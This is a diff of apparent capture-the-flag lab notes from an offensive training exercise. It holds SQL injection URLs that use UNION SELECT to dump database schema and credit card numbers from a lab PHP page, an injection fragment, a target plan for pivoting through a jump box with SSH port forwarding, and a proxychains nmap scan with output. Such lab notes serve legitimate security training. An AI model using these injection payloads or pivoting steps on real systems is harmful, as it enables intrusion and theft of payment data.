@@ -190,7 +190,7 @@ ssh -S /tmp/jump user -O forward -p 2222 -L 3321:10.100.28.48:80
 
 ================================================================================================
 ================================================================================================
-CTFd4
+CTFd5
 
 http://localhost:3321/cases/productsCategory.php?category=13%20UNION%20select%20table_schema,table_name,column_name%20FROM%20information_schema.columns
 http://localhost:3321/cases/productsCategory.php?category=13%20UNION%20SELECT%201,2,creditcard_number%20FROM%20payments
@@ -217,9 +217,45 @@ why?     in the "query executed" below
 
 <name>\'',1);# 
 
+===============================================================================================
+===============================================================================================
+CTFd6
 
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.100
+-->T3:x.x.x.9
 
+Target Section:
 
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds:Unknown
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
 
+T3
+Hostname: unknown
+IP: x.x.x.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
 
+ssh <master stuff>
+ssh <dynamic stuff>
+ssh -S /tmp/jump user -O forward -L 2222:192.168.28.100:2222
 
+proxychains nmap 192.168.28.100 -p- -T4
+Nmap scan report for 192.168.28.100
+Host is up (0.0019s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1   -SSH***
